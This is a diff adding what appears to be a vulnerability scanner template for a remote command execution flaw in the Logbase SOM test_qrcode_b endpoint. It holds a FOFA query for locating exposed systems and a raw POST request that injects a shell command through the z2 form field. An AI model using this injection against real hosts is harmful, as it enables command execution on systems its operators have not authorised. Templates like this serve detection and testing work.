@@ -1,0 +1,35 @@
+id: test_qrcode_b
+info:
+  name: 思福迪Logbase运维安全管理系统test_qrcode_b接口存在远程命令执行漏洞
+  author: mike
+  severity: info
+  description: 思福迪Logbase运维安全管理系统（Logbase SOM）是新一代操作行为管理安全审计系统，通过B/S方式进行管理，其主要功能为实现对运维人员远程操作服务器、网络设备、数据库过程的授权、监控与审计，实现对IT运维过程的全面监管。支持对多种远程维护方式的支持，如字符终端方式（SSH、Telnet、Rlogin）、图形方式（RDP、X11、VNC、Radmin、PCAnywhere）、文件传输（FTP、SFTP）以及多种主流数据库的访问操作。该系统存在远程命令执行漏洞。
+  reference: xxx
+  remediation: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: product="思福迪-LOGBASE"
+http:
+  - raw:
+      - |
+        POST /bhost/test_qrcode_b HTTP/1.1
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Accept-Encoding: gzip, deflate
+        Accept: gzip
+        Connection: close
+        Host: {{Hostname}}
+        Referer: {{BaseURL}}
+        Content-Length: 23
+        Content-Type: application/x-www-form-urlencoded
+
+        z1=1&z2="|id;"&z3=bhost
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "uid"
